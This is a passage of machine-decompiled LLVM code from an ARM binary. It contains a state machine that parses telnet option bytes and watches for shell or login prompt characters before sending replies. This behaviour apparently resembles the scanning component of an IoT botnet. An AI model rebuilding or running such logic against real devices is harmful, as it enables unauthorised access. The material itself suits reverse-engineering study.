  %v0_ffe0 = phi i32 [ %v3_ffdc, %dec_label_pc_ffd4 ], [ %v0_ffe0.pre, %bb359 ]
  %v1_ffe0 = add i32 %v0_ffe0, 1
  store i32 %v1_ffe0, i32* %r2.global-to-local, align 4
  %v3_ffe4 = icmp uge i32 %v5_ffc0, %v1_ffe0
  store i1 %v3_ffe4, i1* %cpsr_c.global-to-local, align 1
  %v9_ffe4 = icmp eq i32 %v5_ffc0, %v1_ffe0
  store i1 %v9_ffe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ffe4, label %dec_label_pc_ffec, label %dec_label_pc_ffd4

dec_label_pc_ffec:                                ; preds = %bb360, %dec_label_pc_108e8
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* @lr, align 4
  %v0_fff0 = load i32, i32* @r6, align 4
  %v1_fff0 = add i32 %v0_fff0, 24
  %v2_fff0 = inttoptr i32 %v1_fff0 to i32*
  %v3_fff0 = load i32, i32* %v2_fff0, align 4
  %v2_fff4 = load i32, i32* @global_var_1cad4.130, align 4
  store i32 %v2_fff4, i32* %r3.global-to-local, align 4
  %v2_fff8 = add i32 %v3_fff0, %v5_ffc0
  store i32 %v2_fff8, i32* %ip.global-to-local, align 4
  store i32 %v2_fff8, i32* %v2_fff0, align 4
  %v0_10000 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000 = load i32, i32* @r6, align 4
  %v2_10000 = add i32 %v1_10000, 8
  %v3_10000 = inttoptr i32 %v2_10000 to i32*
  store i32 %v0_10000, i32* %v3_10000, align 4
  br label %dec_label_pc_10004

dec_label_pc_10004:                               ; preds = %dec_label_pc_105a4, %dec_label_pc_ffec
  %v0_10004 = load i32, i32* @r6, align 4
  %v1_10004 = add i32 %v0_10004, 12
  %v2_10004 = inttoptr i32 %v1_10004 to i32*
  %v3_10004 = load i32, i32* %v2_10004, align 4
  store i32 %v3_10004, i32* %r2.global-to-local, align 4
  %v1_10008 = add i32 %v3_10004, -2
  store i32 %v1_10008, i32* %r3.global-to-local, align 4
  %v7_1000c = icmp eq i32 %v1_10008, 8
  store i1 %v7_1000c, i1* %cpsr_z.global-to-local, align 1
  %v5_10010 = and i32 %v1_10008, 1073741824
  %v6_10010 = icmp ne i32 %v5_10010, 0
  store i1 %v6_10010, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10004, label %dec_label_pc_ff80.loopexit [
    i32 2, label %dec_label_pc_1003c
    i32 3, label %dec_label_pc_10124
    i32 4, label %dec_label_pc_101cc
    i32 5, label %dec_label_pc_10264
    i32 6, label %dec_label_pc_10318
    i32 7, label %dec_label_pc_10730
    i32 8, label %dec_label_pc_105c8
    i32 9, label %dec_label_pc_1067c
    i32 10, label %dec_label_pc_10444
  ]

dec_label_pc_1003c:                               ; preds = %dec_label_pc_10004
  %v1_10040 = add i32 %v0_10004, 24
  %v2_10040 = inttoptr i32 %v1_10040 to i32*
  %v3_10040 = load i32, i32* %v2_10040, align 4
  store i32 %v3_10040, i32* %ip.global-to-local, align 4
  %v0_10044 = load i32, i32* @sb, align 4
  store i32 %v0_10044, i32* @r5, align 4
  store i32 0, i32* @r7, align 4
  %v1_10050 = add i32 %v0_10004, 29
  store i32 %v1_10050, i32* @r4, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v3_1005c116 = icmp eq i32 %v3_10040, 0
  store i1 %v3_1005c116, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_1005c116, i1* %cpsr_z.global-to-local, align 1
  %v6_10060123 = icmp sgt i32 %v3_10040, 0
  br i1 %v6_10060123, label %dec_label_pc_10064.preheader, label %dec_label_pc_10104

dec_label_pc_1005c.loopexit:                      ; preds = %dec_label_pc_1007c
  %v2_10084 = add i32 %v1_10084, 2
  store i32 %v2_10084, i32* @r5, align 4
  %v2_10088 = add i32 %v1_10088, 2
  store i32 %v2_10088, i32* @r4, align 4
  %v2_1008c = add i32 %v1_1008c, 2
  store i32 %v2_1008c, i32* @r7, align 4
  %v3_1005c = icmp uge i32 %v2_1008c, %v1_1005c
  store i1 %v3_1005c, i1* %cpsr_c.global-to-local, align 1
  %v9_1005c = icmp eq i32 %v2_1008c, %v1_1005c
  store i1 %v9_1005c, i1* %cpsr_z.global-to-local, align 1
  %v6_10060 = icmp slt i32 %v2_1008c, %v1_1005c
  br i1 %v6_10060, label %dec_label_pc_10064.preheader, label %dec_label_pc_10104

dec_label_pc_10064.preheader:                     ; preds = %dec_label_pc_1003c, %dec_label_pc_1005c.loopexit
  %v6_1010c193 = phi i32 [ %v6_1010c194, %dec_label_pc_1005c.loopexit ], [ %v0_10004, %dec_label_pc_1003c ]
  %v1_1008c182 = phi i32 [ %v2_1008c, %dec_label_pc_1005c.loopexit ], [ 0, %dec_label_pc_1003c ]
  %v1_10084180 = phi i32 [ %v2_10084, %dec_label_pc_1005c.loopexit ], [ %v0_10044, %dec_label_pc_1003c ]
  %v1_10070178 = phi i32 [ %v1_1005c, %dec_label_pc_1005c.loopexit ], [ %v3_10040, %dec_label_pc_1003c ]
  %v0_10064176 = phi i32 [ %v2_10088, %dec_label_pc_1005c.loopexit ], [ %v1_10050, %dec_label_pc_1003c ]
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %dec_label_pc_10064.preheader, %dec_label_pc_100e4
  %v6_1010c194 = phi i32 [ %v6_1010c193, %dec_label_pc_10064.preheader ], [ %v0_100ec, %dec_label_pc_100e4 ]
  %v1_1008c = phi i32 [ %v1_1008c182, %dec_label_pc_10064.preheader ], [ %v1_100f0, %dec_label_pc_100e4 ]
  %v1_10084 = phi i32 [ %v1_10084180, %dec_label_pc_10064.preheader ], [ %v1_100f8, %dec_label_pc_100e4 ]
  %v1_1005c = phi i32 [ %v1_10070178, %dec_label_pc_10064.preheader ], [ %v3_100ec, %dec_label_pc_100e4 ]
  %v1_10088 = phi i32 [ %v0_10064176, %dec_label_pc_10064.preheader ], [ %v1_100fc, %dec_label_pc_100e4 ]
  %v1_10064 = add i32 %v1_10088, -1
  %v2_10064 = inttoptr i32 %v1_10064 to i8*
  %v3_10064 = load i8, i8* %v2_10064, align 1
  %v4_10064 = zext i8 %v3_10064 to i32
  store i32 %v4_10064, i32* %r3.global-to-local, align 4
  %v2_10068 = icmp eq i8 %v3_10064, -1
  store i1 %v2_10068, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10068, label %dec_label_pc_10070, label %dec_label_pc_10104

dec_label_pc_10070:                               ; preds = %dec_label_pc_10064
  %v0_10070 = load i32, i32* @sb, align 4
  %v2_10070 = add i32 %v0_10070, %v1_1005c
  store i32 %v2_10070, i32* %r2.global-to-local, align 4
  %v3_10074 = icmp uge i32 %v2_10070, %v1_10088
  store i1 %v3_10074, i1* %cpsr_c.global-to-local, align 1
  %v9_10074 = icmp eq i32 %v2_10070, %v1_10088
  store i1 %v9_10074, i1* %cpsr_z.global-to-local, align 1
  %v2_10078 = xor i1 %v3_10074, true
  %v3_10078 = or i1 %v9_10074, %v2_10078
  br i1 %v3_10078, label %dec_label_pc_10104, label %dec_label_pc_1007c

dec_label_pc_1007c:                               ; preds = %dec_label_pc_10070
  %v1_1007c = inttoptr i32 %v1_10088 to i8*
  %v2_1007c = load i8, i8* %v1_1007c, align 1
  %v3_1007c = zext i8 %v2_1007c to i32
  store i32 %v3_1007c, i32* %r3.global-to-local, align 4
  %v2_10080 = icmp eq i8 %v2_1007c, -1
  store i1 %v2_10080, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10080, label %dec_label_pc_1005c.loopexit, label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %dec_label_pc_1007c
  %v2_10094 = icmp ugt i8 %v2_1007c, -4
  store i1 %v2_10094, i1* %cpsr_c.global-to-local, align 1
  %v7_10094 = icmp eq i8 %v2_1007c, -3
  store i1 %v7_10094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10094, label %dec_label_pc_107e4, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %dec_label_pc_10094
  %v1_1009c = add i32 %v1_10084, 2
  store i32 %v1_1009c, i32* %r3.global-to-local, align 4
  %v3_100a0 = icmp uge i32 %v2_10070, %v1_1009c
  store i1 %v3_100a0, i1* %cpsr_c.global-to-local, align 1
  %v9_100a0 = icmp eq i32 %v2_10070, %v1_1009c
  store i1 %v9_100a0, i1* %cpsr_z.global-to-local, align 1
  %v2_100a4 = xor i1 %v3_100a0, true
  %v3_100a4 = or i1 %v9_100a0, %v2_100a4
  br i1 %v3_100a4, label %dec_label_pc_10104, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %bb390, %dec_label_pc_10838, %bb389, %dec_label_pc_1009c
  %v0_100a8 = load i32, i32* @r4, align 4
  %v1_100a8 = inttoptr i32 %v0_100a8 to i8*
  %v2_100a8 = load i8, i8* %v1_100a8, align 1
  %v3_100a8 = zext i8 %v2_100a8 to i32
  store i32 %v3_100a8, i32* %r3.global-to-local, align 4
  %v2_100ac = icmp ugt i8 %v2_100a8, -4
  store i1 %v2_100ac, i1* %cpsr_c.global-to-local, align 1
  %v7_100ac = icmp eq i8 %v2_100a8, -3
  store i1 %v7_100ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100ac, label %bb361, label %dec_label_pc_100b8

bb361:                                            ; preds = %dec_label_pc_100a8
  %v1_100b0 = load i32, i32* @r8, align 4
  %v2_100b0 = trunc i32 %v1_100b0 to i8
  store i8 %v2_100b0, i8* %v1_100a8, align 1
  %v0_100b4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_100b4.pr, label %bb363, label %.dec_label_pc_100b8_crit_edge

.dec_label_pc_100b8_crit_edge:                    ; preds = %bb361
  %v0_100b8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %.dec_label_pc_100b8_crit_edge, %dec_label_pc_100a8
  %v0_100b8 = phi i32 [ %v0_100b8.pre, %.dec_label_pc_100b8_crit_edge ], [ %v3_100a8, %dec_label_pc_100a8 ]
  %v2_100b8 = icmp ugt i32 %v0_100b8, 250
  store i1 %v2_100b8, i1* %cpsr_c.global-to-local, align 1
  %v7_100b8 = icmp eq i32 %v0_100b8, 251
  store i1 %v7_100b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100b8, label %bb362, label %bb363

bb362:                                            ; preds = %dec_label_pc_100b8
  %v1_100bc = load i32, i32* %sl.global-to-local, align 4
  %v2_100bc = trunc i32 %v1_100bc to i8
  %v3_100bc = load i32, i32* @r4, align 4
  %v4_100bc = inttoptr i32 %v3_100bc to i8*
  store i8 %v2_100bc, i8* %v4_100bc, align 1
  br label %bb363

bb363:                                            ; preds = %bb361, %dec_label_pc_100b8, %bb362
  %v0_100c0 = load i32, i32* @r4, align 4
  %v1_100c0 = add i32 %v0_100c0, 1
  %v2_100c0 = inttoptr i32 %v1_100c0 to i8*
  %v3_100c0 = load i8, i8* %v2_100c0, align 1
  %v4_100c0 = zext i8 %v3_100c0 to i32
  store i32 %v4_100c0, i32* %r3.global-to-local, align 4
  %v2_100c4 = icmp ugt i8 %v3_100c0, -4
  store i1 %v2_100c4, i1* %cpsr_c.global-to-local, align 1
  %v7_100c4 = icmp eq i8 %v3_100c0, -3
  store i1 %v7_100c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100c4, label %bb364, label %dec_label_pc_100d0

bb364:                                            ; preds = %bb363
  %v1_100c8 = load i32, i32* @r8, align 4
  %v2_100c8 = trunc i32 %v1_100c8 to i8
  store i8 %v2_100c8, i8* %v2_100c0, align 1
  %v0_100cc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_100cc.pr, label %bb366, label %.dec_label_pc_100d0_crit_edge

.dec_label_pc_100d0_crit_edge:                    ; preds = %bb364
  %v0_100d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %.dec_label_pc_100d0_crit_edge, %bb363
  %v0_100d0 = phi i32 [ %v0_100d0.pre, %.dec_label_pc_100d0_crit_edge ], [ %v4_100c0, %bb363 ]
  %v2_100d0 = icmp ugt i32 %v0_100d0, 250
  store i1 %v2_100d0, i1* %cpsr_c.global-to-local, align 1
  %v7_100d0 = icmp eq i32 %v0_100d0, 251
  store i1 %v7_100d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100d0, label %bb365, label %bb366

bb365:                                            ; preds = %dec_label_pc_100d0
  %v1_100d4 = load i32, i32* %sl.global-to-local, align 4
  %v2_100d4 = trunc i32 %v1_100d4 to i8
  %v3_100d4 = load i32, i32* @r4, align 4
  %v4_100d4 = add i32 %v3_100d4, 1
  %v5_100d4 = inttoptr i32 %v4_100d4 to i8*
  store i8 %v2_100d4, i8* %v5_100d4, align 1
  br label %bb366

bb366:                                            ; preds = %bb364, %dec_label_pc_100d0, %bb365
  %v0_100d8 = load i32, i32* @r6, align 4
  %v1_100d8 = add i32 %v0_100d8, 4
  %v2_100d8 = inttoptr i32 %v1_100d8 to i32*
  %v3_100d8 = load i32, i32* %v2_100d8, align 4
  store i32 %v3_100d8, i32* %r0.global-to-local, align 4
  %v0_100dc = load i32, i32* @r5, align 4
  br label %dec_label_pc_100e4

dec_label_pc_100e4:                               ; preds = %dec_label_pc_10940, %bb366
  %v0_100e8 = phi i32 [ %v3_10958, %dec_label_pc_10940 ], [ %v3_100d8, %bb366 ]
  %storemerge5 = phi i32 [ %v2_107fc, %dec_label_pc_10940 ], [ %v0_100dc, %bb366 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_10940 ], [ 3, %bb366 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_100e8 = inttoptr i32 %storemerge5 to i32*
  %v5_100e8 = call i32 @function_12350(i32 %v0_100e8, i32* %v4_100e8, i32 %storemerge, i32 16384)
  store i32 %v5_100e8, i32* %r0.global-to-local, align 4
  %v0_100ec = load i32, i32* @r6, align 4
  %v1_100ec = add i32 %v0_100ec, 24
  %v2_100ec = inttoptr i32 %v1_100ec to i32*
  %v3_100ec = load i32, i32* %v2_100ec, align 4
  store i32 %v3_100ec, i32* %ip.global-to-local, align 4
  %v0_100f0 = load i32, i32* @r7, align 4
  %v1_100f0 = add i32 %v0_100f0, 3
  store i32 %v1_100f0, i32* @r7, align 4
  %v3_100f4 = icmp uge i32 %v1_100f0, %v3_100ec
  store i1 %v3_100f4, i1* %cpsr_c.global-to-local, align 1
  %v9_100f4 = icmp eq i32 %v1_100f0, %v3_100ec
  store i1 %v9_100f4, i1* %cpsr_z.global-to-local, align 1
  %v0_100f8 = load i32, i32* @r5, align 4
  %v1_100f8 = add i32 %v0_100f8, 3
  store i32 %v1_100f8, i32* @r5, align 4
  %v0_100fc = load i32, i32* @r4, align 4
  %v1_100fc = add i32 %v0_100fc, 3
  store i32 %v1_100fc, i32* @r4, align 4
  %v5_10100 = icmp slt i32 %v1_100f0, %v3_100ec
  br i1 %v5_10100, label %dec_label_pc_10064, label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %dec_label_pc_1005c.loopexit, %dec_label_pc_10064, %dec_label_pc_100e4, %dec_label_pc_1009c, %dec_label_pc_10070, %dec_label_pc_1003c, %dec_label_pc_107e4.dec_label_pc_10104.loopexit_crit_edge
  %v6_1010c = phi i32 [ %v0_10808, %dec_label_pc_107e4.dec_label_pc_10104.loopexit_crit_edge ], [ %v0_10004, %dec_label_pc_1003c ], [ %v6_1010c194, %dec_label_pc_10064 ], [ %v0_100ec, %dec_label_pc_100e4 ], [ %v6_1010c194, %dec_label_pc_1009c ], [ %v6_1010c194, %dec_label_pc_10070 ], [ %v6_1010c194, %dec_label_pc_1005c.loopexit ]
  %v0_10114.pre = phi i32 [ %v0_10104.pre.pre, %dec_label_pc_107e4.dec_label_pc_10104.loopexit_crit_edge ], [ 0, %dec_label_pc_1003c ], [ %v1_1008c, %dec_label_pc_10064 ], [ %v1_100f0, %dec_label_pc_100e4 ], [ %v1_1008c, %dec_label_pc_1009c ], [ %v1_1008c, %dec_label_pc_10070 ], [ %v2_1008c, %dec_label_pc_1005c.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10104 = icmp eq i32 %v0_10114.pre, 0
  store i1 %v2_10104, i1* %cpsr_z.global-to-local, align 1
  %tmp367 = icmp slt i32 %v0_10114.pre, 1
  br i1 %tmp367, label %dec_label_pc_10114, label %.thread238

.thread238:                                       ; preds = %dec_label_pc_10104
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_1010c = add i32 %v6_1010c, 12
  %v8_1010c = inttoptr i32 %v7_1010c to i32*
  store i32 3, i32* %v8_1010c, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10114:                               ; preds = %dec_label_pc_10104, %dec_label_pc_10784, %dec_label_pc_106d0, %dec_label_pc_1061c, %dec_label_pc_104c8, %dec_label_pc_103e4, %dec_label_pc_102b8, %dec_label_pc_10220, %dec_label_pc_10188
  %v0_10114 = phi i32 [ %v1_10778, %dec_label_pc_10784 ], [ %v1_106c4, %dec_label_pc_106d0 ], [ %v1_10610, %dec_label_pc_1061c ], [ %v0_104c0, %dec_label_pc_104c8 ], [ %v1_103d8, %dec_label_pc_103e4 ], [ %v1_102ac, %dec_label_pc_102b8 ], [ %v0_10220, %dec_label_pc_10220 ], [ %v0_10188, %dec_label_pc_10188 ], [ %v0_10114.pre, %dec_label_pc_10104 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10114 = icmp eq i32 %v0_10114, 0
  store i1 %v2_10114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10114, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_1011c

dec_label_pc_1011c:                               ; preds = %dec_label_pc_10114
  %v0_1011c = load i32, i32* @r6, align 4
  %v1_1011c = add i32 %v0_1011c, 24
  %v2_1011c = inttoptr i32 %v1_1011c to i32*
  %v3_1011c = load i32, i32* %v2_1011c, align 4
  store i32 %v3_1011c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10124:                               ; preds = %dec_label_pc_10004
  %v1_10124 = add i32 %v0_10004, 24
  %v2_10124 = inttoptr i32 %v1_10124 to i32*
  %v3_10124 = load i32, i32* %v2_10124, align 4
  store i32 %v3_10124, i32* %r3.global-to-local, align 4
  %v1_10128 = add i32 %v3_10124, -1
  store i32 %v1_10128, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1012c = icmp eq i32 %v1_10128, 0
  store i1 %v2_1012c, i1* %cpsr_z.global-to-local, align 1
  %v5_10130 = icmp sgt i32 %v1_10128, 0
  br i1 %v5_10130, label %dec_label_pc_10158, label %dec_label_pc_fee0

dec_label_pc_10138:                               ; preds = %bb368
  %v2_10138 = icmp ugt i8 %v3_1015c, 35
  store i1 %v2_10138, i1* %cpsr_c.global-to-local, align 1
  %v7_10138 = icmp eq i8 %v3_1015c, 36
  store i1 %v7_10138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10138, label %dec_label_pc_1016c, label %dec_label_pc_10140

dec_label_pc_10140:                               ; preds = %dec_label_pc_10138
  %v2_10140 = icmp ugt i8 %v3_1015c, 34
  store i1 %v2_10140, i1* %cpsr_c.global-to-local, align 1
  %v7_10140 = icmp eq i8 %v3_1015c, 35
  store i1 %v7_10140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10140, label %dec_label_pc_1016c, label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_10140
  %v2_10148 = icmp ugt i8 %v3_1015c, 36
  store i1 %v2_10148, i1* %cpsr_c.global-to-local, align 1
  %v7_10148 = icmp eq i8 %v3_1015c, 37
  store i1 %v7_10148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10148, label %dec_label_pc_1016c, label %dec_label_pc_10150

dec_label_pc_10150:                               ; preds = %dec_label_pc_10148
  %v1_10150 = add i32 %v0_1016c, -1
  store i32 %v1_10150, i32* %r0.global-to-local, align 4
  %v2_10150 = icmp ne i32 %v0_1016c, 0
  store i1 %v2_10150, i1* %cpsr_c.global-to-local, align 1
  %v7_10150 = icmp eq i32 %v0_1016c, 1
  store i1 %v7_10150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10150, label %dec_label_pc_fee0, label %dec_label_pc_10158

dec_label_pc_10158:                               ; preds = %dec_label_pc_10124, %dec_label_pc_10150
  %v0_1016c = phi i32 [ %v1_10150, %dec_label_pc_10150 ], [ %v1_10128, %dec_label_pc_10124 ]
  %v2_10158 = add i32 %v0_1016c, %v0_10004
  store i32 %v2_10158, i32* %r3.global-to-local, align 4
  %v1_1015c = add i32 %v2_10158, 28
  %v2_1015c = inttoptr i32 %v1_1015c to i8*
  %v3_1015c = load i8, i8* %v2_1015c, align 1
  %v4_1015c = zext i8 %v3_1015c to i32
  store i32 %v4_1015c, i32* %r3.global-to-local, align 4
  %v2_10160 = icmp ugt i8 %v3_1015c, 61
  store i1 %v2_10160, i1* %cpsr_c.global-to-local, align 1
  %v7_10160 = icmp eq i8 %v3_1015c, 62
  store i1 %v7_10160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10160, label %dec_label_pc_1016c, label %bb368

bb368:                                            ; preds = %dec_label_pc_10158
  %v3_10164 = icmp ugt i8 %v3_1015c, 57
  store i1 %v3_10164, i1* %cpsr_c.global-to-local, align 1
  %v8_10164 = icmp eq i8 %v3_1015c, 58
  store i1 %v8_10164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10164, label %dec_label_pc_1016c, label %dec_label_pc_10138

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10158, %bb368, %dec_label_pc_10148, %dec_label_pc_10140, %dec_label_pc_10138
  %v1_1016c = add i32 %v0_1016c, 1
  store i32 %v1_1016c, i32* @r7, align 4
  %v2_10170 = icmp eq i32 %v1_1016c, -1
  store i1 %v2_10170, i1* %cpsr_c.global-to-local, align 1
  %v7_10170 = icmp eq i32 %v0_1016c, -2
  store i1 %v7_10170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10170, label %dec_label_pc_fee0, label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_1016c
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_1017c = call i32 @function_10b68(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10184 = call i32 @function_10b68(i32 27)
  store i32 %v1_10184, i32* %r0.global-to-local, align 4
  %v0_10188.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10188

dec_label_pc_10188:                               ; preds = %dec_label_pc_ff68, %dec_label_pc_10178
  %v0_10188 = phi i32 [ %v0_ff78, %dec_label_pc_ff68 ], [ %v0_10188.pre, %dec_label_pc_10178 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10188 = icmp eq i32 %v0_10188, 0
  store i1 %v2_10188, i1* %cpsr_z.global-to-local, align 1
  %tmp369 = icmp slt i32 %v0_10188, 1
  br i1 %tmp369, label %dec_label_pc_10114, label %dec_label_pc_10190

dec_label_pc_10190:                               ; preds = %dec_label_pc_10188
  %v0_10190 = load i32, i32* @r6, align 4
  %v1_10190 = inttoptr i32 %v0_10190 to i32*
  %v2_10190 = load i32, i32* %v1_10190, align 4
  store i32 %v2_10190, i32* %r3.global-to-local, align 4
  %v1_10194 = add i32 %v0_10190, 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  %v3_10194 = load i32, i32* %v2_10194, align 4
  store i32 %v3_10194, i32* %r0.global-to-local, align 4
  %v1_10198 = add i32 %v2_10190, 12
  %v2_10198 = inttoptr i32 %v1_10198 to i8*
  %v3_10198 = load i8, i8* %v2_10198, align 1
  %v4_10198 = zext i8 %v3_10198 to i32
  store i32 %v4_10198, i32* %r2.global-to-local, align 4
  %v1_1019c = inttoptr i32 %v2_10190 to i32*
  %v2_1019c = load i32, i32* %v1_1019c, align 4
  store i32 %v2_1019c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_101a4 = inttoptr i32 %v2_1019c to i32*
  %v5_101a4 = call i32 @function_12350(i32 %v3_10194, i32* %v4_101a4, i32 %v4_10198, i32 16384)
  store i32 %v5_101a4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_101ac = load i32, i32* @r6, align 4
  %v1_101ac = add i32 %v0_101ac, 4
  %v2_101ac = inttoptr i32 %v1_101ac to i32*
  %v3_101ac = load i32, i32* %v2_101ac, align 4
  store i32 %v3_101ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_101b8 = call i32 @function_12350(i32 %v3_101ac, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 %v5_101b8, i32* %r0.global-to-local, align 4
  %v0_101bc = load i32, i32* @r6, align 4
  %v1_101bc = add i32 %v0_101bc, 24
  %v2_101bc = inttoptr i32 %v1_101bc to i32*
  %v3_101bc = load i32, i32* %v2_101bc, align 4
  store i32 %v3_101bc, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_101c4 = add i32 %v0_101bc, 12
  %v3_101c4 = inttoptr i32 %v2_101c4 to i32*
  store i32 4, i32* %v3_101c4, align 4
  br label %dec_label_pc_105a4

dec_label_pc_101cc:                               ; preds = %dec_label_pc_10004
  %v1_101cc = add i32 %v0_10004, 24
  %v2_101cc = inttoptr i32 %v1_101cc to i32*
  %v3_101cc = load i32, i32* %v2_101cc, align 4
  store i32 %v3_101cc, i32* %r3.global-to-local, align 4
  %v1_101d0 = add i32 %v3_101cc, -1
  store i32 %v1_101d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_101d4 = icmp eq i32 %v1_101d0, 0
  store i1 %v2_101d4, i1* %cpsr_z.global-to-local, align 1
  %v5_101d8 = icmp sgt i32 %v1_101d0, 0
  br i1 %v5_101d8, label %dec_label_pc_101f8, label %dec_label_pc_10844

dec_label_pc_101e0:                               ; preds = %bb370
  %v2_101e0 = icmp ugt i8 %v3_101fc, 35
  store i1 %v2_101e0, i1* %cpsr_c.global-to-local, align 1
  %v7_101e0 = icmp eq i8 %v3_101fc, 36
  store i1 %v7_101e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101e0, label %dec_label_pc_1020c, label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101e0
  %v2_101e8 = icmp ugt i8 %v3_101fc, 34
  store i1 %v2_101e8, i1* %cpsr_c.global-to-local, align 1
  %v7_101e8 = icmp eq i8 %v3_101fc, 35
  store i1 %v7_101e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101e8, label %dec_label_pc_1020c, label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %dec_label_pc_101e8
  %v1_101f0 = add i32 %v0_1020c, -1
  store i32 %v1_101f0, i32* %r0.global-to-local, align 4
  %v2_101f0 = icmp ne i32 %v0_1020c, 0
  store i1 %v2_101f0, i1* %cpsr_c.global-to-local, align 1
  %v7_101f0 = icmp eq i32 %v0_1020c, 1
  store i1 %v7_101f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_101f0, label %dec_label_pc_10844, label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101cc, %dec_label_pc_101f0
  %v0_1020c = phi i32 [ %v1_101f0, %dec_label_pc_101f0 ], [ %v1_101d0, %dec_label_pc_101cc ]
  %v2_101f8 = add i32 %v0_1020c, %v0_10004
  store i32 %v2_101f8, i32* %r3.global-to-local, align 4
  %v1_101fc = add i32 %v2_101f8, 28
  %v2_101fc = inttoptr i32 %v1_101fc to i8*
  %v3_101fc = load i8, i8* %v2_101fc, align 1
  %v4_101fc = zext i8 %v3_101fc to i32
  store i32 %v4_101fc, i32* %r3.global-to-local, align 4
  %v2_10200 = icmp ugt i8 %v3_101fc, 61
  store i1 %v2_10200, i1* %cpsr_c.global-to-local, align 1
  %v7_10200 = icmp eq i8 %v3_101fc, 62
  store i1 %v7_10200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10200, label %dec_label_pc_1020c, label %bb370

bb370:                                            ; preds = %dec_label_pc_101f8
  %v3_10204 = icmp ugt i8 %v3_101fc, 57
  store i1 %v3_10204, i1* %cpsr_c.global-to-local, align 1
  %v8_10204 = icmp eq i8 %v3_101fc, 58
  store i1 %v8_10204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10204, label %dec_label_pc_1020c, label %dec_label_pc_101e0

dec_label_pc_1020c:                               ; preds = %dec_label_pc_101f8, %bb370, %dec_label_pc_101e8, %dec_label_pc_101e0
  %v1_1020c = add i32 %v0_1020c, 1
  store i32 %v1_1020c, i32* @r7, align 4
  %v2_10210 = icmp eq i32 %v1_1020c, -1
  store i1 %v2_10210, i1* %cpsr_c.global-to-local, align 1
  %v7_10210 = icmp eq i32 %v0_1020c, -2
  store i1 %v7_10210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10210, label %dec_label_pc_10844, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %dec_label_pc_1020c
  store i32 25, i32* %r0.global-to-local, align 4
